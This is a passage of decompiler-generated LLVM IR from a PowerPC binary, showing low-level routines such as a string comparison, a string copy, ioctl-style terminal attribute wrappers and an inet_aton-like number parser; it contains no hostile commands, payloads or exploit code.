  %v0_1000730c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000730c, i32* @r4, align 4
  %v0_10007310 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10007310, i32* @r3, align 4
  store i32 %v0_10007314, i32* @r5, align 4
  store i32 268464924, i32* @lr, align 4
  %v0_10007318 = call i32 @function_10006d8c()
  %v1_1000731c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000731c = add i32 %v1_1000731c, %v0_10007310
  %v3_10007324 = add i32 %v2_1000731c, -1
  %v4_10007324 = inttoptr i32 %v3_10007324 to i8*
  store i8 0, i8* %v4_10007324, align 1
  br label %dec_label_pc_10007328

dec_label_pc_10007328:                            ; preds = %dec_label_pc_10007304, %dec_label_pc_1000730c
  %v0_10007328 = load i32, i32* %r28.global-to-local, align 4
  %v3_10007328 = icmp eq i32 %v0_10007328, 0
  br i1 %v3_10007328, label %dec_label_pc_10007338, label %dec_label_pc_10007330

dec_label_pc_10007330:                            ; preds = %dec_label_pc_10007328
  %v0_10007330 = call i32 @function_10004b48()
  %v0_10007334 = load i32, i32* %r28.global-to-local, align 4
  %v2_10007334 = inttoptr i32 %v0_10007330 to i32*
  store i32 %v0_10007334, i32* %v2_10007334, align 4
  %v0_1000733c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10007338

dec_label_pc_10007338:                            ; preds = %dec_label_pc_10007328, %dec_label_pc_10007330
  %v0_1000733c = phi i32 [ 0, %dec_label_pc_10007328 ], [ %v0_1000733c.pre, %dec_label_pc_10007330 ]
  ret i32 %v0_1000733c

; uselistorder directives
  uselistorder i32 %v2_100072e0, { 1, 0 }
  uselistorder i32 %v4_100072d4, { 1, 0 }
  uselistorder i32 %v1_100072dc, { 1, 2, 0 }
  uselistorder i32 %v1_10007278, { 1, 0 }
  uselistorder i32 %v0_10007244, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1000e10c.244 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007338, { 1, 0 }
  uselistorder label %dec_label_pc_10007328, { 1, 0 }
  uselistorder label %dec_label_pc_10007304, { 1, 0 }
  uselistorder label %dec_label_pc_100072d4, { 1, 0 }
  uselistorder label %dec_label_pc_10007274, { 1, 0 }
}

define i32 @function_10007350(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007350:
  %v2_1000735c = call i32 @function_1000a3e4(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000735c
}

define i32 @function_10007360(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007360:
  %v3_10007364 = load i32, i32* bitcast (i32** @global_var_10010454.246 to i32*), align 4
  %v0_1000736c.pre = load i32, i32* @r3, align 4
  %v1_1000736c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000736c

dec_label_pc_1000736c:                            ; preds = %dec_label_pc_10007394, %dec_label_pc_10007360
  %v0_100073a86 = phi i32 [ %v0_100073a87, %dec_label_pc_10007394 ], [ 0, %dec_label_pc_10007360 ]
  %v0_10007398 = phi i32 [ %v1_10007398, %dec_label_pc_10007394 ], [ %v1_1000736c.pre, %dec_label_pc_10007360 ]
  %v0_1000739c = phi i32 [ %v1_1000739c, %dec_label_pc_10007394 ], [ %v0_1000736c.pre, %dec_label_pc_10007360 ]
  %v4_1000736c = icmp eq i32 %v0_1000739c, %v0_10007398
  %.pre = inttoptr i32 %v0_1000739c to i8*
  br i1 %v4_1000736c, label %dec_label_pc_10007394, label %dec_label_pc_10007374

dec_label_pc_10007374:                            ; preds = %dec_label_pc_1000736c
  %v2_10007374 = load i8, i8* %.pre, align 1
  %v3_10007374 = zext i8 %v2_10007374 to i32
  %v1_10007378 = inttoptr i32 %v0_10007398 to i8*
  %v2_10007378 = load i8, i8* %v1_10007378, align 1
  %v3_10007378 = zext i8 %v2_10007378 to i32
  %v1_1000737c = mul nuw nsw i32 %v3_10007374, 2
  %v1_10007380 = mul nuw nsw i32 %v3_10007378, 2
  %v2_10007384 = add i32 %v1_1000737c, %v3_10007364
  %v3_10007384 = inttoptr i32 %v2_10007384 to i16*
  %v4_10007384 = load i16, i16* %v3_10007384, align 2
  %v5_10007384 = sext i16 %v4_10007384 to i32
  %v2_10007388 = add i32 %v1_10007380, %v3_10007364
  %v3_10007388 = inttoptr i32 %v2_10007388 to i16*
  %v4_10007388 = load i16, i16* %v3_10007388, align 2
  %v5_10007388 = sext i16 %v4_10007388 to i32
  %v2_1000738c = sub nsw i32 %v5_10007384, %v5_10007388
  %v4_10007390 = icmp eq i16 %v4_10007384, %v4_10007388
  br i1 %v4_10007390, label %dec_label_pc_10007394, label %dec_label_pc_100073a8

dec_label_pc_10007394:                            ; preds = %dec_label_pc_1000736c, %dec_label_pc_10007374
  %v0_100073a87 = phi i32 [ %v2_1000738c, %dec_label_pc_10007374 ], [ %v0_100073a86, %dec_label_pc_1000736c ]
  %v2_10007394 = load i8, i8* %.pre, align 1
  %v1_10007398 = add i32 %v0_10007398, 1
  %v1_1000739c = add i32 %v0_1000739c, 1
  %v3_100073a0 = icmp eq i8 %v2_10007394, 0
  br i1 %v3_100073a0, label %dec_label_pc_100073a8, label %dec_label_pc_1000736c

dec_label_pc_100073a8:                            ; preds = %dec_label_pc_10007394, %dec_label_pc_10007374
  %v0_100073a8 = phi i32 [ %v0_100073a87, %dec_label_pc_10007394 ], [ %v2_1000738c, %dec_label_pc_10007374 ]
  ret i32 %v0_100073a8

; uselistorder directives
  uselistorder i32 %v2_1000738c, { 1, 0 }
  uselistorder i32 %v0_1000739c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007394, { 1, 0 }
}

define i32 @function_100073b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100073b0:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_100073c4 = call i32 @function_10006ed8()
  %v1_100073c8 = add i32 %v0_100073c4, 1
  store i32 %v1_100073c8, i32* @r29, align 4
  store i32 268465108, i32* @lr, align 4
  %v1_100073d0 = call i32 @function_10007cf0(i32 %v1_100073c8)
  store i32 %v1_100073d0, i32* @r3, align 4
  %v0_100073d4 = load i32, i32* @r28, align 4
  store i32 %v0_100073d4, i32* @r4, align 4
  store i32 %v1_100073d0, i32* @r31, align 4
  %v3_100073d8 = icmp eq i32 %v1_100073d0, 0
  %v0_100073dc = load i32, i32* @r29, align 4
  store i32 %v0_100073dc, i32* @r5, align 4
  br i1 %v3_100073d8, label %dec_label_pc_100073e8, label %dec_label_pc_100073e4

dec_label_pc_100073e4:                            ; preds = %dec_label_pc_100073b0
  store i32 268465128, i32* @lr, align 4
  %v0_100073e4 = call i32 @function_10006d8c()
  %v0_100073ec.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100073e8

dec_label_pc_100073e8:                            ; preds = %dec_label_pc_100073b0, %dec_label_pc_100073e4
  %v0_100073ec = phi i32 [ 0, %dec_label_pc_100073b0 ], [ %v0_100073ec.pre, %dec_label_pc_100073e4 ]
  ret i32 %v0_100073ec

; uselistorder directives
  uselistorder label %dec_label_pc_100073e8, { 1, 0 }
}

define i32 @function_10007400(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007400:
  store i32 ptrtoint (i32* @global_var_1001049c.247 to i32), i32* @r5, align 4
  %v1_10007408 = call i32 @function_1000a6b8(i32 ptrtoint (i32* @global_var_1001049c.247 to i32))
  ret i32 %v1_10007408
}

define i32 @function_1000740c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000740c:
  %stack_var_-72 = alloca i32, align 4
  store i32 268465184, i32* @lr, align 4
  %v2_1000741c = call i32 @function_10007438(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @function_10007438, { 1, 0 }
}

define i32 @function_10007438(i32* %arg1) local_unnamed_addr {
dec_label_pc_10007438:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000743c = load i32, i32* @lr, align 4
  store i32 %v0_1000743c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000744c = ptrtoint i32* %stack_var_-56 to i32
  store i32 268465248, i32* @lr, align 4
  %v3_1000745c = call i32 @function_100047f8(i32 1076655123, i32 %v2_1000744c, i32 %v2_1000744c)
  %v2_10007460 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10007460, i32* @r4, align 4
  store i32 %v3_1000745c, i32* @r30, align 4
  %v3_10007464 = icmp eq i32 %v3_1000745c, 0
  store i32 19, i32* @r5, align 4
  %v0_1000746c = load i32, i32* @r31, align 4
  br i1 %v3_10007464, label %dec_label_pc_10007474, label %dec_label_pc_100074bc

dec_label_pc_10007474:                            ; preds = %dec_label_pc_10007438
  %v1_1000746c = add i32 %v0_1000746c, 17
  %v3_1000748c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000748c, i32* %r0.global-to-local, align 4
  %v2_10007490 = add i32 %v0_1000746c, 4
  %v3_10007490 = inttoptr i32 %v2_10007490 to i32*
  store i32 %tmp7, i32* %v3_10007490, align 4
  %v0_10007494 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007494 = load i32, i32* @r31, align 4
  %v2_10007494 = inttoptr i32 %v1_10007494 to i32*
  store i32 %v0_10007494, i32* %v2_10007494, align 4
  %v0_10007498 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007498 = load i32, i32* @r31, align 4
  %v2_10007498 = add i32 %v1_10007498, 8
  %v3_10007498 = inttoptr i32 %v2_10007498 to i32*
  store i32 %v0_10007498, i32* %v3_10007498, align 4
  %v0_1000749c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000749c = load i32, i32* @r31, align 4
  %v2_1000749c = add i32 %v1_1000749c, 12
  %v3_1000749c = inttoptr i32 %v2_1000749c to i32*
  store i32 %v0_1000749c, i32* %v3_1000749c, align 4
  %v3_100074a0 = load i32, i32* @r31, align 4
  %v4_100074a0 = add i32 %v3_100074a0, 16
  %v5_100074a0 = inttoptr i32 %v4_100074a0 to i8*
  store i8 %tmp4, i8* %v5_100074a0, align 1
  %v1_100074a4 = load i32, i32* @r31, align 4
  %v2_100074a4 = add i32 %v1_100074a4, 52
  %v3_100074a4 = inttoptr i32 %v2_100074a4 to i32*
  store i32 %tmp3, i32* %v3_100074a4, align 4
  %v1_100074a8 = load i32, i32* @r31, align 4
  %v2_100074a8 = add i32 %v1_100074a8, 56
  %v3_100074a8 = inttoptr i32 %v2_100074a8 to i32*
  store i32 %tmp2, i32* %v3_100074a8, align 4
  store i32 268465328, i32* @lr, align 4
  %v6_100074ac = sext i8 %tmp4 to i32
  %v8_100074ac = call i32 @function_1000a590(i32 %v1_1000746c, i32 %v2_10007460, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_100074ac, i32 %tmp7)
  store i32 268465340, i32* @lr, align 4
  %v3_100074b8 = call i32 @function_10006e28(i32 %v8_100074ac, i32 0, i32 13)
  %v0_100074c0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100074bc

dec_label_pc_100074bc:                            ; preds = %dec_label_pc_10007438, %dec_label_pc_10007474
  %v0_100074c0 = phi i32 [ %v3_1000745c, %dec_label_pc_10007438 ], [ %v0_100074c0.pre, %dec_label_pc_10007474 ]
  store i32 %v0_1000743c, i32* %r0.global-to-local, align 4
  ret i32 %v0_100074c0

; uselistorder directives
  uselistorder i32 %v2_1000744c, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_100074bc, { 1, 0 }
}

define i32 @function_100074d4() local_unnamed_addr {
dec_label_pc_100074d4:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100074d4 = load i32, i32* @r4, align 4
  %v3_100074d4 = icmp eq i32 %v0_100074d4, 1
  %v0_100074e4 = load i32, i32* @r3, align 4
  store i32 %v0_100074e4, i32* @r27, align 4
  %v0_100074ec = load i32, i32* @r5, align 4
  store i32 %v0_100074ec, i32* @r31, align 4
  br i1 %v3_100074d4, label %dec_label_pc_10007510, label %dec_label_pc_100074f4

dec_label_pc_100074f4:                            ; preds = %dec_label_pc_100074d4
  %v3_100074f4 = icmp eq i32 %v0_100074d4, 2
  br i1 %v3_100074f4, label %dec_label_pc_10007530, label %dec_label_pc_100074fc

dec_label_pc_100074fc:                            ; preds = %dec_label_pc_100074f4
  %v3_100074fc = icmp eq i32 %v0_100074d4, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_100074fc, label %dec_label_pc_10007538, label %dec_label_pc_1000751c

dec_label_pc_10007510:                            ; preds = %dec_label_pc_100074d4
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_10007538

dec_label_pc_1000751c:                            ; preds = %dec_label_pc_100074fc
  %v0_1000751c = call i32 @function_10004b48()
  store i32 -1, i32* @r28, align 4
  %v2_10007528 = inttoptr i32 %v0_1000751c to i32*
  store i32 22, i32* %v2_10007528, align 4
  br label %dec_label_pc_10007620

dec_label_pc_10007530:                            ; preds = %dec_label_pc_100074f4
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_10007538

dec_label_pc_10007538:                            ; preds = %dec_label_pc_100074fc, %dec_label_pc_10007510, %dec_label_pc_10007530
  %v1_10007538 = inttoptr i32 %v0_100074ec to i32*
  %v2_10007538 = load i32, i32* %v1_10007538, align 4
  store i32 19, i32* @r5, align 4
  %v1_10007540 = add i32 %v0_100074ec, 4
  %v2_10007540 = inttoptr i32 %v1_10007540 to i32*
  %v3_10007540 = load i32, i32* %v2_10007540, align 4
  store i32 %v3_10007540, i32* %r9.global-to-local, align 4
  %v1_10007544 = add i32 %v0_100074ec, 17
  store i32 %v1_10007544, i32* @r4, align 4
  %v1_10007548 = add i32 %v0_100074ec, 8
  %v2_10007548 = inttoptr i32 %v1_10007548 to i32*
  %v3_10007548 = load i32, i32* %v2_10007548, align 4
  %v2_1000754c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000754c, i32* @r3, align 4
  %v2_10007554 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10007554, i32* @r26, align 4
  store i32 %v2_10007538, i32* %stack_var_-72, align 4
  store i32 268465540, i32* @lr, align 4
  %v0_10007580 = call i32 @function_10006d8c()
  %v0_10007584 = load i32, i32* @r27, align 4
  %v0_10007588 = load i32, i32* @r30, align 4
  store i32 268465560, i32* @lr, align 4
  %v3_10007594 = call i32 @function_100047f8(i32 %v0_10007584, i32 %v0_10007588, i32 %v2_10007554)
  store i32 %v3_10007594, i32* @r28, align 4
  %v3_10007598 = icmp eq i32 %v3_10007594, 0
  br i1 %v3_10007598, label %dec_label_pc_100075a0, label %dec_label_pc_10007620

dec_label_pc_100075a0:                            ; preds = %dec_label_pc_10007538
  %v0_100075a0 = load i32, i32* @r30, align 4
  %v3_100075a4 = icmp eq i32 %v0_100075a0, -2144570348
  br i1 %v3_100075a4, label %dec_label_pc_100075ac, label %dec_label_pc_1000761c

dec_label_pc_100075ac:                            ; preds = %dec_label_pc_100075a0
  %v0_100075ac = call i32 @function_10004b48()
  store i32 %v0_100075ac, i32* @r29, align 4
  %v0_100075bc = load i32, i32* @r27, align 4
  %v1_100075c4 = inttoptr i32 %v0_100075ac to i32*
  %v2_100075c4 = load i32, i32* %v1_100075c4, align 4
  store i32 %v2_100075c4, i32* @r30, align 4
  store i32 268465616, i32* @lr, align 4
  %v3_100075cc = call i32 @function_100047f8(i32 %v0_100075bc, i32 1076655123, i32 %v2_10007554)
  %v3_100075d0 = icmp eq i32 %v3_100075cc, 0
  br i1 %v3_100075d0, label %dec_label_pc_100075e0, label %dec_label_pc_100075d8

dec_label_pc_100075d8:                            ; preds = %dec_label_pc_100075ac
  %v0_100075d8 = load i32, i32* @r30, align 4
  %v1_100075d8 = load i32, i32* @r29, align 4
  %v2_100075d8 = inttoptr i32 %v1_100075d8 to i32*
  store i32 %v0_100075d8, i32* %v2_100075d8, align 4
  br label %dec_label_pc_10007620

dec_label_pc_100075e0:                            ; preds = %dec_label_pc_100075ac
  %v0_100075e0 = load i32, i32* @r31, align 4
  %v1_100075e0 = add i32 %v0_100075e0, 8
  %v2_100075e0 = inttoptr i32 %v1_100075e0 to i32*
  %v3_100075e0 = load i32, i32* %v2_100075e0, align 4
  %v1_100075e8 = call i32 @__asm_rlwinm(i32 %v3_100075e0, i32 0, i32 19, i32 20)
  %v1_100075ec = call i32 @__asm_rlwinm(i32 %v3_10007548, i32 0, i32 19, i32 20)
  store i32 %v1_100075ec, i32* %r9.global-to-local, align 4
  %v4_100075f0 = icmp eq i32 %v1_100075e8, %v1_100075ec
  br i1 %v4_100075f0, label %dec_label_pc_100075f8, label %dec_label_pc_1000760c

dec_label_pc_100075f8:                            ; preds = %dec_label_pc_100075e0
  %v1_100075f8 = and i32 %v3_100075e0, 768
  store i32 %v1_100075f8, i32* %r9.global-to-local, align 4
  %v3_100075f8 = icmp eq i32 %v1_100075f8, 0
  br i1 %v3_100075f8, label %dec_label_pc_1000761c, label %dec_label_pc_10007600

dec_label_pc_10007600:                            ; preds = %dec_label_pc_100075f8
  %v1_10007600 = call i32 @__asm_rlwinm(i32 %v3_10007548, i32 0, i32 22, i32 23)
  %v0_10007604 = load i32, i32* %r9.global-to-local, align 4
  %v4_10007604 = icmp eq i32 %v0_10007604, %v1_10007600
  br i1 %v4_10007604, label %dec_label_pc_1000761c, label %dec_label_pc_1000760c

dec_label_pc_1000760c:                            ; preds = %dec_label_pc_100075e0, %dec_label_pc_10007600
  store i32 -1, i32* @r28, align 4
  %v1_10007614 = load i32, i32* @r29, align 4
  %v2_10007614 = inttoptr i32 %v1_10007614 to i32*
  store i32 22, i32* %v2_10007614, align 4
  br label %dec_label_pc_10007620

dec_label_pc_1000761c:                            ; preds = %dec_label_pc_100075a0, %dec_label_pc_10007600, %dec_label_pc_100075f8
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10007620

dec_label_pc_10007620:                            ; preds = %dec_label_pc_10007538, %dec_label_pc_100075d8, %dec_label_pc_1000751c, %dec_label_pc_1000760c, %dec_label_pc_1000761c
  %v0_10007624 = load i32, i32* @r28, align 4
  ret i32 %v0_10007624

; uselistorder directives
  uselistorder i32 %v0_100074ec, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_100047f8, { 2, 1, 0, 3 }
  uselistorder i32 19, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_10007620, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000761c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000760c, { 1, 0 }
  uselistorder label %dec_label_pc_10007538, { 2, 1, 0 }
}

define i32 @function_10007638(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007638:
  %v0_10007638 = load i32, i32* @r3, align 4
  ret i32 %v0_10007638
}

define i32 @function_10007644(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007644:
  %v0_10007644 = load i32, i32* @r3, align 4
  ret i32 %v0_10007644
}

define i32 @function_10007648(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007648:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v0_1000765c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000765c

dec_label_pc_1000765c:                            ; preds = %dec_label_pc_1000774c, %dec_label_pc_10007648
  %v0_10007670 = phi i32 [ %v1_1000774c, %dec_label_pc_1000774c ], [ %v0_1000765c.pre, %dec_label_pc_10007648 ]
  %v1_1000765c = inttoptr i32 %v0_10007670 to i8*
  %v2_1000765c = load i8, i8* %v1_1000765c, align 1
  %v3_1000765c = zext i8 %v2_1000765c to i32
  store i32 %v3_1000765c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r8.global-to-local, align 4
  %v3_10007668 = icmp eq i8 %v2_1000765c, 48
  store i1 %v3_10007668, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007668, label %dec_label_pc_10007670, label %dec_label_pc_10007698

dec_label_pc_10007670:                            ; preds = %dec_label_pc_1000765c
  %v1_10007670 = add i32 %v0_10007670, 1
  %v2_10007670 = inttoptr i32 %v1_10007670 to i8*
  %v3_10007670 = load i8, i8* %v2_10007670, align 1
  %v4_10007670 = zext i8 %v3_10007670 to i32
  store i32 %v4_10007670, i32* %r0.global-to-local, align 4
  store i32 %v1_10007670, i32* @r3, align 4
  %v3_10007674 = icmp eq i8 %v3_10007670, 120
  store i1 %v3_10007674, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007674, label %dec_label_pc_1000768c, label %dec_label_pc_1000767c

dec_label_pc_1000767c:                            ; preds = %dec_label_pc_10007670
  %v3_1000767c = icmp eq i8 %v3_10007670, 88
  store i1 %v3_1000767c, i1* %cr7_eq.global-to-local, align 1
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 8, i32* %r8.global-to-local, align 4
  br i1 %v3_1000767c, label %dec_label_pc_1000768c, label %dec_label_pc_10007698

dec_label_pc_1000768c:                            ; preds = %dec_label_pc_1000767c, %dec_label_pc_10007670
  %v1_1000768c = add i32 %v0_10007670, 2
  store i32 %v1_1000768c, i32* @r3, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10007698

dec_label_pc_10007698:                            ; preds = %dec_label_pc_1000767c, %dec_label_pc_1000765c, %dec_label_pc_1000768c
  %v0_100077105 = phi i32 [ %v1_10007670, %dec_label_pc_1000767c ], [ %v0_10007670, %dec_label_pc_1000765c ], [ %v1_1000768c, %dec_label_pc_1000768c ]
  %v0_10007698 = phi i32 [ 8, %dec_label_pc_1000767c ], [ 10, %dec_label_pc_1000765c ], [ 16, %dec_label_pc_1000768c ]
  %v3_10007698 = icmp eq i32 %v0_10007698, 8
  store i1 %v3_10007698, i1* %cr1_eq.global-to-local, align 1
  %v3_1000769c = icmp eq i32 %v0_10007698, 16
  store i1 %v3_1000769c, i1* %cr6_eq.global-to-local, align 1
  %v3_100076a0 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_100076a0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007710

dec_label_pc_100076ac:                            ; preds = %dec_label_pc_10007710
  %v1_10007718 = mul nuw nsw i32 %v3_10007710, 2
  %v1_100076ac = load i32, i32* %r4.global-to-local, align 4
  %v2_100076ac = add i32 %v1_100076ac, %v1_10007718
  %v3_100076ac = inttoptr i32 %v2_100076ac to i16*
  %v4_100076ac = load i16, i16* %v3_100076ac, align 2
  %v5_100076ac = zext i16 %v4_100076ac to i32
  %v1_100076b0 = mul i32 %v0_100076b0, 16
  store i32 %v1_100076b0, i32* %r10.global-to-local, align 4
  %v1_100076b4 = and i32 %v5_100076ac, 8
  %v3_100076b4 = icmp eq i32 %v1_100076b4, 0
  store i1 %v3_100076b4, i1* %cr0_eq.global-to-local, align 1
  %v1_100076b8 = call i32 @__asm_rlwinm(i32 %v5_100076ac, i32 28, i32 31, i32 31)
  %v1_100076bc = call i32 @__asm_rlwinm(i32 %v5_100076ac, i32 31, i32 31, i32 31)
  %v3_100076c0 = icmp eq i32 %v1_100076b8, 0
  store i1 %v3_100076c0, i1* %cr7_eq.global-to-local, align 1
  %not.v2_100076c4 = icmp eq i32 %v1_100076bc, 0
  %v6_100076c8 = sext i1 %not.v2_100076c4 to i32
  %v1_100076cc = call i32 @__asm_rlwinm(i32 %v6_100076c8, i32 0, i32 26, i32 26)
  %v1_100076d0 = add i32 %v1_100076cc, -87
  %v0_100076d4 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_100076d4, label %dec_label_pc_100076f4, label %dec_label_pc_100076d8

dec_label_pc_100076d8:                            ; preds = %dec_label_pc_100076ac
  %v0_100076d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_100076d8 = icmp ugt i32 %v0_100076d8, 55
  %v3_100076d8 = icmp eq i32 %v0_100076d8, 55
  store i1 %v3_100076d8, i1* %cr7_eq.global-to-local, align 1
  %v0_100076dc = load i1, i1* %cr1_eq.global-to-local, align 1
  %brmerge.demorgan = and i1 %v2_100076d8, %v0_100076dc
  br i1 %brmerge.demorgan, label %dec_label_pc_1000775c, label %dec_label_pc_100076e4

dec_label_pc_100076e4:                            ; preds = %dec_label_pc_100076d8
  %v0_100076e4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100076e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100076e4 = mul i32 %v1_100076e4, %v0_100076e4
  %v2_100076e8 = add i32 %v2_100076e4, %v0_100076d8
  %v1_100076ec = add i32 %v2_100076e8, -48
  br label %dec_label_pc_10007700

dec_label_pc_100076f4:                            ; preds = %dec_label_pc_100076ac
  %v0_100076f4 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_100076f4, label %dec_label_pc_100076f8, label %dec_label_pc_10007720

dec_label_pc_100076f8:                            ; preds = %dec_label_pc_100076f4
  %v0_100076f8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100076f8, label %dec_label_pc_10007720, label %dec_label_pc_100076fc

dec_label_pc_100076fc:                            ; preds = %dec_label_pc_100076f8
  %v0_100076fc = load i32, i32* %r10.global-to-local, align 4
  %v2_100076fc = add i32 %v0_100076fc, %v1_100076d0
  br label %dec_label_pc_10007700

dec_label_pc_10007700:                            ; preds = %dec_label_pc_100076e4, %dec_label_pc_100076fc
  %storemerge = phi i32 [ %v1_100076ec, %dec_label_pc_100076e4 ], [ %v2_100076fc, %dec_label_pc_100076fc ]
  store i32 %storemerge, i32* %r11.global-to-local, align 4
  %v2_10007700 = icmp ugt i32 %storemerge, 255
  %v3_10007700 = icmp eq i32 %storemerge, 255
  store i1 %v3_10007700, i1* %cr7_eq.global-to-local, align 1
  %v0_10007704 = load i32, i32* @r3, align 4
  %v1_10007704 = add i32 %v0_10007704, 1
  store i32 %v1_10007704, i32* @r3, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  br i1 %v2_10007700, label %dec_label_pc_1000775c, label %dec_label_pc_10007710

dec_label_pc_10007710:                            ; preds = %dec_label_pc_10007700, %dec_label_pc_10007698
  %v0_100076b0 = phi i32 [ %storemerge, %dec_label_pc_10007700 ], [ 0, %dec_label_pc_10007698 ]
  %v0_10007710 = phi i32 [ %v1_10007704, %dec_label_pc_10007700 ], [ %v0_100077105, %dec_label_pc_10007698 ]
  %v1_10007710 = inttoptr i32 %v0_10007710 to i8*
  %v2_10007710 = load i8, i8* %v1_10007710, align 1
  %v3_10007710 = zext i8 %v2_10007710 to i32
  store i32 %v3_10007710, i32* %r0.global-to-local, align 4
  %v3_10007714 = icmp eq i8 %v2_10007710, 0
  store i1 %v3_10007714, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007714, label %dec_label_pc_10007720, label %dec_label_pc_100076ac

dec_label_pc_10007720:                            ; preds = %dec_label_pc_100076f4, %dec_label_pc_10007710, %dec_label_pc_100076f8
  %v0_10007720 = load i32, i32* %r7.global-to-local, align 4
  %v3_10007720 = icmp eq i32 %v0_10007720, 0
  store i1 %v3_10007720, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007720, label %dec_label_pc_1000775c, label %dec_label_pc_10007728

dec_label_pc_10007728:                            ; preds = %dec_label_pc_10007720
  %v0_10007728 = load i32, i32* %r5.global-to-local, align 4
  %v3_10007728 = icmp eq i32 %v0_10007728, 0
  store i1 %v3_10007728, i1* %cr7_eq.global-to-local, align 1
  %v0_10007738.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v3_10007728, label %dec_label_pc_10007734, label %dec_label_pc_10007730

dec_label_pc_10007730:                            ; preds = %dec_label_pc_10007728
  %v1_10007730 = mul i32 %v0_10007738.pre, 256
  store i32 %v1_10007730, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007734

dec_label_pc_10007734:                            ; preds = %dec_label_pc_10007728, %dec_label_pc_10007730
  %v0_10007738 = phi i32 [ %v1_10007730, %dec_label_pc_10007730 ], [ %v0_10007738.pre, %dec_label_pc_10007728 ]
